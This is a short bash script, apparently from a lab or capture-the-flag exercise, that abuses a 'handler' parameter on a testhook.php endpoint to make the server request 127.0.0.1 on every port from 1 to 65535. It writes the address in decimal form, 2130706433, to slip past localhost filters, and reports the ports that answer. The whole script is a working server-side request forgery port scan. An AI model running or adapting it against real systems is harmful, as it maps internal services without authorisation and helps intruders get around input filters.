#!/bin/bash

for x in {1..65535};
	do cmd=$(curl -so /dev/null -X POST http://10.10.47.226/testhook.php --data "handler=http://2130706433:${x}" -w '%{size_download}')
#2130706433 is the complete string version of '127.0.0.1'
#Reference : https://stackoverflow.com/questions/2241229/going-from-127-0-0-1-to-2130706433-and-back-again
	if [ $cmd != 0 ]; then
		echo "Port open: $x"
	fi
done 